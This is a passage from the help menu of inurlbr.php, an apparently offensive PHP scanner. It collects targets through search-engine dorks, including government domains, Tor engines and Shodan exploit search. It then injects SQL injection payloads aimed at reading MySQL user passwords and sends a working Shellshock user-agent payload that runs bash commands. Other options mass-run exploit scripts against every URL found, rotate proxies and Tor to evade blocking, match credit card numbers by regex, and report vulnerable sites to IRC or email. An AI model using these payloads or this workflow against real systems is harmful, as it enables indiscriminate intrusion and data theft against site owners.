     {$_SESSION["c1"]}22{$_SESSION["c0"]}  - {$_SESSION["c2"]}DUCK DUCK GO
     {$_SESSION["c1"]}23{$_SESSION["c0"]}  - {$_SESSION["c2"]}BOOROW
     {$_SESSION["c1"]}24{$_SESSION["c0"]}  - {$_SESSION["c2"]}GOOGLE(CSE) GENERIC RANDOM
     ----------------------------------------
                 SPECIAL MOTORS
     ----------------------------------------
     {$_SESSION["c1"]}e1{$_SESSION["c0"]}  - {$_SESSION["c2"]}TOR FIND
     {$_SESSION["c1"]}e2{$_SESSION["c0"]}  - {$_SESSION["c2"]}ELEPHANT
     {$_SESSION["c1"]}e3{$_SESSION["c0"]}  - {$_SESSION["c2"]}TORSEARCH
     {$_SESSION["c1"]}e4{$_SESSION["c0"]}  - {$_SESSION["c2"]}WIKILEAKS
     {$_SESSION["c1"]}e5{$_SESSION["c0"]}  - {$_SESSION["c2"]}OTN
     {$_SESSION["c1"]}e6{$_SESSION["c0"]}  - {$_SESSION["c2"]}EXPLOITS SHODAN
     ----------------------------------------
     {$_SESSION["c1"]}all{$_SESSION["c0"]} - {$_SESSION["c2"]}All search engines / not special motors{$_SESSION["c0"]}
     Default:    {$_SESSION["c1"]}1{$_SESSION["c0"]}
     Example: {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}1{$_SESSION["c0"]}
              {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}5{$_SESSION["c0"]}
               Using more than one engine:  {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}1,2,5,6,11,24{$_SESSION["c0"]}
               Using all engines:      {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}all{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}--proxy{$_SESSION["c0"]} Choose which proxy you want to use through the search engine:
     Example: {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}{proxy:port}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}localhost:8118{$_SESSION["c0"]}
              {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}socks5://googleinurl@localhost:9050{$_SESSION["c0"]}
              {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}http://admin:12334@172.16.0.90:8080{$_SESSION["c0"]}
   
 {$_SESSION["c1"]}--proxy-file{$_SESSION["c0"]} Set font file to randomize your proxy to each search engine.
     Example: {$_SESSION["c1"]}--proxy-file {$_SESSION["c2"]}{proxys}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--proxy-file {$_SESSION["c2"]}proxys_list.txt{$_SESSION["c0"]}

 {$_SESSION["c1"]}--time-proxy{$_SESSION["c0"]} Set the time how often the proxy will be exchanged.
     Example: {$_SESSION["c1"]}--time-proxy {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--time-proxy {$_SESSION["c2"]}10{$_SESSION["c0"]}

 {$_SESSION["c1"]}--proxy-http-file{$_SESSION["c0"]} Set file with urls http proxy, 
     are used to bular capch search engines
     Example: {$_SESSION["c1"]}--proxy-http-file {$_SESSION["c2"]}{youfilehttp}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--proxy-http-file {$_SESSION["c2"]}http_proxys.txt{$_SESSION["c0"]}
         

 {$_SESSION["c1"]}--tor-random{$_SESSION["c0"]} Enables the TOR function, each usage links an unique IP.
 
 {$_SESSION["c1"]}-t{$_SESSION["c0"]}  Choose the validation type: op {$_SESSION["c2"]}1, 2, 3, 4, 5{$_SESSION["c0"]}
     [options]:
     {$_SESSION["c2"]}1{$_SESSION["c0"]}   - The first type uses default errors considering the script:
     It establishes connection with the exploit through the get method.
     Demo: www.alvo.com.br/pasta/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
   
     {$_SESSION["c2"]}2{$_SESSION["c0"]}   -  The second type tries to valid the error defined by: {$_SESSION["c1"]}-a={$_SESSION["c2"]}'VALUE_INSIDE_THE _TARGET'{$_SESSION["c0"]}
     It also establishes connection with the exploit through the get method
     Demo: www.alvo.com.br/pasta/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
   
     {$_SESSION["c2"]}3{$_SESSION["c0"]}   - The third type combine both first and second types:
     Then, of course, it also establishes connection with the exploit through the get method
     Demo: www.target.com.br{$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     Default:    {$_SESSION["c2"]}1{$_SESSION["c0"]}
     Example: {$_SESSION["c1"]}-t {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-t {$_SESSION["c2"]}1{$_SESSION["c0"]}
     
     {$_SESSION["c2"]}4{$_SESSION["c0"]}   - The fourth type a validation based on source file and will be enabled scanner standard functions.
     The source file their values are concatenated with target url.
     - Set your target with command {$_SESSION["c1"]}--target {$_SESSION["c2"]}{http://target}{$_SESSION["c0"]}
     - Set your file with command {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Explicative:
     Source file values:
     /admin/index.php?id=
     /pag/index.php?id=
     /brazil.php?new=
     Demo: 
     www.target.com.br/admin/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     www.target.com.br/pag/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     www.target.com.br/brazil.php?new={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     
     {$_SESSION["c2"]}5{$_SESSION["c0"]}   - (FIND PAGE) The fifth type of validation based on the source file,
     Will be enabled only one validation code 200 on the target server, or if the url submit such code will be considered vulnerable.
     - Set your target with command {$_SESSION["c1"]}--target {$_SESSION["c2"]}{http://target}{$_SESSION["c0"]}
     - Set your file with command {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Explicative:
     Source file values:
     /admin/admin.php
     /admin.asp
     /admin.aspx
     Demo: 
     www.target.com.br/admin/admin.php
     www.target.com.br/admin.asp
     www.target.com.br/admin.aspx
     Observation: If it shows the code 200 will be separated in the output file

     DEFAULT ERRORS:  
     {$_SESSION["c11"]}
     [*]JAVA INFINITYDB, [*]LOCAL FILE INCLUSION, [*]ZIMBRA MAIL,           [*]ZEND FRAMEWORK, 
     [*]ERROR MARIADB,   [*]ERROR MYSQL,          [*]ERROR JBOSSWEB,        [*]ERROR MICROSOFT,
     [*]ERROR ODBC,      [*]ERROR POSTGRESQL,     [*]ERROR JAVA INFINITYDB, [*]ERROR PHP,
     [*]CMS WORDPRESS,   [*]SHELL WEB,            [*]ERROR JDBC,            [*]ERROR ASP,
     [*]ERROR ORACLE,    [*]ERROR DB2,            [*]JDBC CFM,              [*]ERROS LUA, 
     [*]ERROR INDEFINITE
     {$_SESSION["c0"]}
         
 {$_SESSION["c1"]}--dork{$_SESSION["c0"]} Defines which dork the search engine will use.
     Example: {$_SESSION["c1"]}--dork {$_SESSION["c2"]}{dork}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br inurl:php? id'{$_SESSION["c0"]}
     - Using multiples dorks:
     Example: {$_SESSION["c1"]}--dork {$_SESSION["c2"]}{[DORK]dork1[DORK]dork2[DORK]dork3}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'{$_SESSION["c0"]}
 
 {$_SESSION["c1"]}--dork-file{$_SESSION["c0"]} Set font file with your search dorks.
     Example: {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}{dork_file}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorks.txt'{$_SESSION["c0"]}

 {$_SESSION["c1"]}--exploit-get{$_SESSION["c0"]} Defines which exploit will be injected through the GET method to each URL found.
     Example: {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}{exploit_get}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?'´%270x27;\"{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}--exploit-post{$_SESSION["c0"]} Defines which exploit will be injected through the POST method to each URL found.
     Example: {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}{exploit_post}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}'field1=valor1&field2=valor2&field3=?´0x273exploit;&botao=ok'{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]} Defines which exploit/parameter will be executed in the options: {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all{$_SESSION["c0"]}.   
     The exploit-command will be identified by the paramaters: {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}      
     Ex {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}'/admin/config.conf' {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'curl -v {$_SESSION["c8"]}_TARGET_{$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c2"]}'{$_SESSION["c0"]}
     _TARGET_ is the specified URL/TARGET obtained by the process
     _EXPLOIT_ is the exploit/parameter defined by the option {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
     Example: {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}{exploit-command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}'/admin/config.conf'{$_SESSION["c0"]}  
     
 {$_SESSION["c1"]}-a{$_SESSION["c0"]}  Specify the string that will be used on the search script:
     Example: {$_SESSION["c1"]}-a {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-a {$_SESSION["c2"]}'<title>hello world</title>'{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}-d{$_SESSION["c0"]}  Specify the script usage op {$_SESSION["c2"]}1, 2, 3, 4, 5.{$_SESSION["c0"]}
     Example: {$_SESSION["c1"]}-d {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-d {$_SESSION["c2"]}1 {$_SESSION["c0"]}/URL of the search engine.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}2 {$_SESSION["c0"]}/Show all the url.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}3 {$_SESSION["c0"]}/Detailed request of every URL.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}4 {$_SESSION["c0"]}/Shows the HTML of every URL.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}5 {$_SESSION["c0"]}/Detailed request of all URLs.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}6 {$_SESSION["c0"]}/Detailed PING - PONG irc.    
             
 {$_SESSION["c1"]}-s{$_SESSION["c0"]}  Specify the output file where it will be saved the vulnerable URLs.
     
     Example: {$_SESSION["c1"]}-s {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-s {$_SESSION["c2"]}your_file.txt
     
 {$_SESSION["c1"]}-o{$_SESSION["c0"]}  Manually manage the vulnerable URLs you want to use from a file, without using a search engine.
     Example: {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file_where_my_urls_are}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-o {$_SESSION["c2"]}tests.txt
   
 {$_SESSION["c1"]}--persist{$_SESSION["c0"]}  Attempts when Google blocks your search.
     The script tries to another google host / default = 4
     Example: {$_SESSION["c1"]}--persist {$_SESSION["c2"]}{number_attempts}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--persist {$_SESSION["c2"]}7

 {$_SESSION["c1"]}--ifredirect{$_SESSION["c0"]}  Return validation method post REDIRECT_URL
     Example: {$_SESSION["c1"]}--ifredirect {$_SESSION["c2"]}{string_validation}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--ifredirect {$_SESSION["c2"]}'/admin/painel.php'

 {$_SESSION["c1"]}-m{$_SESSION["c0"]}  Enable the search for emails on the urls specified.
  
 {$_SESSION["c1"]}-u{$_SESSION["c0"]}  Enables the search for URL lists on the url specified.
 
 {$_SESSION["c1"]}--gc{$_SESSION["c0"]} Enable validation of values ​​with google webcache.
     
 {$_SESSION["c1"]}--pr{$_SESSION["c0"]}  Progressive scan, used to set operators (dorks), 
     makes the search of a dork and valid results, then goes a dork at a time.
  
 {$_SESSION["c1"]}--file-cookie{$_SESSION["c0"]} Open cookie file.
     
 {$_SESSION["c1"]}--save-as{$_SESSION["c0"]} Save results in a certain place.

 {$_SESSION["c1"]}--shellshock{$_SESSION["c0"]} Explore shellshock vulnerability by setting a malicious user-agent.
 
 {$_SESSION["c1"]}--popup{$_SESSION["c0"]} Run --command all or vuln in a parallel terminal.

 {$_SESSION["c1"]}--cms-check{$_SESSION["c0"]} Enable simple check if the url / target is using CMS.

 {$_SESSION["c1"]}--no-banner{$_SESSION["c0"]} Remove the script presentation banner.
     
 {$_SESSION["c1"]}--unique{$_SESSION["c0"]} Filter results in unique domains.

 {$_SESSION["c1"]}--beep{$_SESSION["c0"]} Beep sound when a vulnerability is found.
     
 {$_SESSION["c1"]}--alexa-rank{$_SESSION["c0"]} Show alexa positioning in the results.
     
 {$_SESSION["c1"]}--robots{$_SESSION["c0"]} Show values file robots.
      
 {$_SESSION["c1"]}--range{$_SESSION["c0"]} Set range IP.
      Example: {$_SESSION["c1"]}--range {$_SESSION["c2"]}{range_start,rage_end}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--range {$_SESSION["c2"]}'172.16.0.5#172.16.0.255'

 {$_SESSION["c1"]}--range-rand{$_SESSION["c0"]} Set amount of random ips.
      Example: {$_SESSION["c1"]}--range-rand {$_SESSION["c2"]}{rand}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--range-rand {$_SESSION["c2"]}'50'

 {$_SESSION["c1"]}--irc{$_SESSION["c0"]} Sending vulnerable to IRC / server channel.
      Example: {$_SESSION["c1"]}--irc {$_SESSION["c2"]}{server#channel}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--irc {$_SESSION["c2"]}'irc.rizon.net#inurlbrasil'

 {$_SESSION["c1"]}--http-header{$_SESSION["c0"]} Set HTTP header.
      Example: {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}'HTTP/1.1 401 Unauthorized,WWW-Authenticate: Basic realm=\"Top Secret\"'
          
 {$_SESSION["c1"]}--sedmail{$_SESSION["c0"]} Sending vulnerable to email.
      Example: {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}youemail@inurl.com.br
          
 {$_SESSION["c1"]}--delay{$_SESSION["c0"]} Delay between research processes.
      Example: {$_SESSION["c1"]}--delay {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--delay {$_SESSION["c2"]}10
  
 {$_SESSION["c1"]}--time-out{$_SESSION["c0"]} Timeout to exit the process.
      Example: {$_SESSION["c1"]}--time-out {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--time-out {$_SESSION["c2"]}10

 {$_SESSION["c1"]}--ifurl{$_SESSION["c0"]} Filter URLs based on their argument.
      Example: {$_SESSION["c1"]}--ifurl {$_SESSION["c2"]}{ifurl}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--ifurl {$_SESSION["c2"]}index.php?id=

 {$_SESSION["c1"]}--ifcode{$_SESSION["c0"]} Valid results based on your return http code.
      Example: {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}{ifcode}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}200
 
 {$_SESSION["c1"]}--ifemail{$_SESSION["c0"]} Filter E-mails based on their argument.
     Example: {$_SESSION["c1"]}--ifemail {$_SESSION["c2"]}{file_where_my_emails_are}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--ifemail {$_SESSION["c2"]}sp.gov.br

 {$_SESSION["c1"]}--url-reference{$_SESSION["c0"]} Define referring URL in the request to send him against the target.
      Example: {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}{url}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}http://target.com/admin/user/valid.php
 
 {$_SESSION["c1"]}--mp{$_SESSION["c0"]} Limits the number of pages in the search engines.
     Example: {$_SESSION["c1"]}--mp {$_SESSION["c2"]}{limit}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--mp {$_SESSION["c2"]}50
     
 {$_SESSION["c1"]}--user-agent{$_SESSION["c0"]} Define the user agent used in its request against the target.
      Example: {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}{agent}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
      Usage-exploit / SHELLSHOCK:   
      {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}'() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;\"'
      Complete command:    
      php inurlbr.php --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
 
 {$_SESSION["c1"]}--sall{$_SESSION["c0"]} Saves all urls found by the scanner.
     Example: {$_SESSION["c1"]}--sall {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sall {$_SESSION["c2"]}your_file.txt

 {$_SESSION["c1"]}--command-vul{$_SESSION["c0"]} Every vulnerable URL found will execute this command parameters.
     Example: {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
                  
 {$_SESSION["c1"]}--command-all{$_SESSION["c0"]} Use this commmand to specify a single command to EVERY URL found.
     Example: {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
    [!] Observation:
   
    {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} will be replaced by the URL/target found, although if the user  
    doesn't input the get, only the domain will be executed.
   
    {$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c0"]} will be replaced by the original URL / target found.
       
    {$_SESSION["c14"]}_TARGETXPL_{$_SESSION["c0"]} will be replaced by the original URL / target found + EXPLOIT --exploit-get.
       
    {$_SESSION["c9"]}_TARGETIP_{$_SESSION["c0"]} return of ip URL / target found.
        
    {$_SESSION["c8"]}_URI_{$_SESSION["c0"]} Back URL set of folders / target found.
        
    {$_SESSION["c15"]}_RANDOM_{$_SESSION["c0"]} Random strings.
        
    {$_SESSION["c9"]}_PORT_{$_SESSION["c0"]} Capture port of the current test, within the --port-scan process.
   
    {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}  will be replaced by the specified command argument {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
   The exploit-command will be identified by the parameters {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}

 {$_SESSION["c1"]}--replace{$_SESSION["c0"]} Replace values ​​in the target URL.
    Example:  {$_SESSION["c1"]}--replace {$_SESSION["c2"]}{value_old[INURL]value_new}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.aspx?id=[INURL]index.aspx?id=1%27´'{$_SESSION["c0"]}
                  
 {$_SESSION["c1"]}--remove{$_SESSION["c0"]} Remove values ​​in the target URL.
      Example: {$_SESSION["c1"]}--remove {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--remove {$_SESSION["c2"]}'/admin.php?id=0'
              
 {$_SESSION["c1"]}--regexp{$_SESSION["c0"]} Using regular expression to validate his research, the value of the 
    Expression will be sought within the target/URL.
    Example:  {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} {regular_expression}{$_SESSION["c0"]}
    All Major Credit Cards:
    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6011[0-9]{12}|3(?:0[0-5]|[68][0-9])[0-9]{11}|3[47][0-9]{13})'{$_SESSION["c0"]}
    
    IP Addresses:
    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'{$_SESSION["c0"]}
    
    EMAIL:   
    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
    

 {$_SESSION["c1"]}---regexp-filter{$_SESSION["c0"]} Using regular expression to filter his research, the value of the 
     Expression will be sought within the target/URL.
    Example:  {$_SESSION["c1"]}---regexp-filter{$_SESSION["c2"]} {regular_expression}{$_SESSION["c0"]}
    EMAIL:   
    Usage:    {$_SESSION["c1"]}---regexp-filter{$_SESSION["c2"]} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
 

    [!] Small commands manager:
    
 {$_SESSION["c1"]}--exploit-cad{$_SESSION["c0"]} Command register for use within the scanner.
    Format {TYPE_EXPLOIT}::{EXPLOIT_COMMAND}
    Example Format: NMAP::nmap -sV _TARGET_
    Example Format: EXPLOIT1::php xpl.php -t _TARGET_ -s output.txt
    Usage:    {$_SESSION["c1"]}--exploit-cad{$_SESSION["c2"]} 'NMAP::nmap -sV _TARGET_'{$_SESSION["c0"]} 
    Observation: Each registered command is identified by an id of your array.
                 Commands are logged in exploits.conf file.

 {$_SESSION["c1"]}--exploit-all-id{$_SESSION["c0"]} Execute commands, exploits based on id of use,
    (all) is run for each target found by the engine.
     Example: {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}1,2,8,22
         
 {$_SESSION["c1"]}--exploit-vul-id{$_SESSION["c0"]} Execute commands, exploits based on id of use,
    (vull) run command only if the target was considered vulnerable.
     Example: {$_SESSION["c1"]}--exploit-vul-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-vul-id {$_SESSION["c2"]}1,2,8,22

 {$_SESSION["c1"]}--exploit-list{$_SESSION["c0"]} List all entries command in exploits.conf file.


    [!] Running subprocesses:
    
 {$_SESSION["c1"]}--sub-file{$_SESSION["c0"]}  Subprocess performs an injection 
     strings in URLs found by the engine, via GET or POST.
     Example: {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}{youfile}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}exploits_get.txt
         
 {$_SESSION["c1"]}--sub-get{$_SESSION["c0"]} defines whether the strings coming from 
     --sub-file will be injected via GET.
     Usage:   {$_SESSION["c1"]}--sub-get
         
 {$_SESSION["c1"]}--sub-post{$_SESSION["c0"]} defines whether the strings coming from 
     --sub-file will be injected via POST.
     Usage:   {$_SESSION["c1"]}--sub-get
         
 {$_SESSION["c1"]}--sub-concat{$_SESSION["c0"]} Sets string to be concatenated with 
     the target host within the subprocess
     Example: {$_SESSION["c1"]}--sub-concat {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-concat {$_SESSION["c2"]}'/login.php'{$_SESSION["c0"]}

 {$_SESSION["c1"]}--sub-cmd-vul{$_SESSION["c0"]} Each vulnerable URL found within the sub-process
     will execute the parameters of this command.
     Example: {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
                  
 {$_SESSION["c1"]}--sub-cmd-all{$_SESSION["c0"]} Run command to each target found within the sub-process scope.
     Example: {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}


 {$_SESSION["c1"]}--port-scan{$_SESSION["c0"]} Defines ports that will be validated as open.
     Example: {$_SESSION["c1"]}--port-scan {$_SESSION["c2"]}{ports}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--port-scan {$_SESSION["c2"]}'22,21,23,3306'{$_SESSION["c0"]}
         
 {$_SESSION["c1"]}--port-cmd{$_SESSION["c0"]} Define command that runs when finding an open door.
     Example: {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}'./xpl _TARGETIP_:_PORT_'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}'./xpl _TARGETIP_/file.php?sqli=1'{$_SESSION["c0"]}

 {$_SESSION["c1"]}--port-write{$_SESSION["c0"]} Send values for door.
     Example: {$_SESSION["c1"]}--port-write {$_SESSION["c2"]}{'value0','value1','value3'}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--port-write {$_SESSION["c2"]}\"'NICK nk_test','USER nk_test 8 * :_ola','JOIN #inurlbrasil','PRIVMSG #inurlbrasil : minha_msg'\"{$_SESSION["c0"]}



    [!] Modifying values used within script parameters:
    
 {$_SESSION["c1"]}md5{$_SESSION["c0"]} Encrypt values in md5.
     Example: {$_SESSION["c1"]}md5({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}md5({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=md5({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}

 {$_SESSION["c1"]}base64{$_SESSION["c0"]} Encrypt values in base64.
     Example: {$_SESSION["c1"]}base64({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}base64({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=base64({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}
         
